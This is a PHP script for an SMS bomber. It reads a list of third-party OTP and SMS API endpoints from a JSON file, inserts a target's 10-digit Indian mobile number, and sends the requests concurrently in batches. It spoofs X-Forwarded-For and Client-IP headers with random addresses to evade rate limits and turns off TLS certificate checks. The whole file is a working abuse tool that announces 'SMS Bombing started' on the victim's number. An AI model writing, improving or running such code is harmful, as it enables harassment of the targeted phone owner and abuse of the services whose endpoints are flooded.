<?php
error_reporting(0);
set_time_limit(300);

// Configuration
$config = [
    'max_requests' => 50, // एक बार में कितने requests भेजने हैं
    'timeout' => 2,
    'batch_size' => 20
];

// Function to generate random IP
function generateRandomIP() {
    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
}

// Function to make single request
function makeRequest($api, $mobile) {
    $url = str_replace(["{no}", "{cc}", "{dur}"], [$mobile, "91", "1"], $api['url']);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $api['method']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    
    $headers = [];
    if (isset($api['headers'])) {
        foreach ($api['headers'] as $key => $value) {
            $headers[] = "$key: $value";
        }
    }
    $headers[] = "X-Forwarded-For: " . generateRandomIP();
    $headers[] = "Client-IP: " . generateRandomIP();
    $headers[] = "Accept-Language: en-US,en;q=0.9";
    $headers[] = "Cache-Control: no-cache";
    $headers[] = "Connection: close";
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    if (isset($api['body']) && !empty($api['body']) && $api['method'] !== 'GET') {
        if (is_array($api['body'])) {
            $body = json_encode($api['body']);
            $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $body);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
    }
    
    $start = microtime(true);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $timeTaken = round((microtime(true) - $start) * 1000);
    
    curl_close($ch);
    
    return [
        "name" => $api['name'],
        "httpCode" => $httpCode,
        "time" => $timeTaken,
        "success" => ($httpCode >= 200 && $httpCode < 300) ? true : false,
        "response" => $response ? json_decode($response, true) : null
    ];
}

// Function to make concurrent requests
function makeConcurrentRequests($apis, $mobile, $batchSize = 20) {
    $results = [];
    $totalApis = count($apis);
    
    $batches = array_chunk($apis, $batchSize);
    
    foreach ($batches as $batchIndex => $batch) {
        $mh = curl_multi_init();
        $curlHandles = [];
        $active = null;
        
        foreach ($batch as $api) {
            $url = str_replace(["{no}", "{cc}", "{dur}"], [$mobile, "91", "1"], $api['url']);
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $api['method']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
            curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
            curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
            curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 2);
            
            $headers = [];
            if (isset($api['headers'])) {
                foreach ($api['headers'] as $key => $value) {
                    $headers[] = "$key: $value";
                }
            }
            $headers[] = "X-Forwarded-For: " . generateRandomIP();
            $headers[] = "Connection: close";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            if (isset($api['body']) && !empty($api['body']) && $api['method'] !== 'GET') {
                if (is_array($api['body'])) {
                    $body = json_encode($api['body']);
                    $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $body);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
                }
            }
            
            curl_multi_add_handle($mh, $ch);
            $curlHandles[] = ['handle' => $ch, 'name' => $api['name'], 'api' => $api];
        }
        
        do {
            curl_multi_exec($mh, $active);
            if ($active) {
                curl_multi_select($mh, 0.05);
            }
        } while ($active);
        
        foreach ($curlHandles as $item) {
            $httpCode = curl_getinfo($item['handle'], CURLINFO_HTTP_CODE);
            $response = curl_multi_getcontent($item['handle']);
            $results[$item['name']] = [
                "name" => $item['name'],
                "httpCode" => $httpCode,
                "success" => ($httpCode >= 200 && $httpCode < 300),
                "response" => $response ? json_decode($response, true) : null
            ];
            curl_multi_remove_handle($mh, $item['handle']);
            curl_close($item['handle']);
        }
        
        curl_multi_close($mh);
        
        if ($batchIndex < count($batches) - 1) {
            usleep(100000);
        }
    }
    
    return $results;
}

// Main logic
if (isset($_GET['submit']) && isset($_GET['mobile'])) {
    $mobile = preg_replace('/[^0-9]/', '', $_GET['mobile']);
    
    if (strlen($mobile) == 10) {
        $apiJson = file_get_contents('kalki.json');
        $apis = json_decode($apiJson, true);
        
        if ($apis) {
            shuffle($apis);
            $startTime = microtime(true);
            $results = makeConcurrentRequests($apis, $mobile, 20);
            $totalTime = round(microtime(true) - $startTime, 2);
            
            $successful = count(array_filter($results, function($r) { return $r['success']; }));
            $failed = count($results) - $successful;
            $message = "✅ SMS Bombing started on $mobile";
        }
    } else {
        $message = "❌ Please enter a valid 10-digit number";
    }
}

// For Cloudflare Pages - Generate static HTML
if (isset($_SERVER['CLOUDFLARE_PAGES'])) {
    ob_start();
    include 'template.html';
    $html = ob_get_clean();
    file_put_contents('index.html', $html);
}
?>
